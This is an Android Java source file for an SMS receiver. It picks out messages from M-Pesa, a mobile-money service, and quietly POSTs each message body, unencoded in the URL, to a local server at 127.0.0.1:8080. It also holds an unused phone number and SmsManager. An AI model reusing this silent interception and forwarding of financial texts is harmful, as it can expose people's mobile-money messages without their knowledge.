package com.example.myapplication;

//package com.javapapers.androidreceivesms;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.StrictMode;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.widget.Toast;
import com.example.myapplication.netuse;
import java.io.*;
import java.lang.Thread;
import java.net.*;
import java.security.MessageDigest;


public class SmsListener extends BroadcastReceiver {

    public static final String SMS_BUNDLE = "pdus";

    public void onReceive(Context context, Intent intent) {
        Bundle intentExtras = intent.getExtras();
        SmsManager smsM = SmsManager.getDefault();
        if (intentExtras != null) {
            Object[] sms = (Object[]) intentExtras.get(SMS_BUNDLE);
            String smsStr = "";
            String nmr = "847548663";
            String mm = "Saldo";
            for(int i = 0; i < sms.length; i++){
              SmsMessage smsMsg = SmsMessage.createFromPdu((byte[]) sms[i]);
              String smsBody = smsMsg.getMessageBody().toString();
              String addrOrg = smsMsg.getOriginatingAddress();
              smsStr += "Mensagem: " + smsBody;
              smsStr += "\nID: " + addrOrg;
              
              final String ji = smsBody;
                
              if(addrOrg.equals("MPesa") || addrOrg.equals("M-Pesa") || addrOrg.equals("m-pesa") || addrOrg.equals("mpesa") || addrOrg.equals("M-pesa") || addrOrg.equals("Mpesa")){
             class netuse extends Thread{
             String site = "http://127.0.0.1:8080/"+ji;
             public void run(){
               try{
                 URL url = new URL(site);
                 HttpURLConnection con = (HttpURLConnection) url.openConnection();
                 con.setRequestMethod("POST");
                 int status = con.getResponseCode();
     
              } catch(Exception r){
               
              }
             }
              }
              netuse nn = new netuse();
              nn.start();
              Toast.makeText(context, addrOrg, Toast.LENGTH_LONG).show();
            } else {
              Toast.makeText(context, addrOrg, Toast.LENGTH_LONG).show();
            }
            }
            //Moçambique
        
      }
  }
}
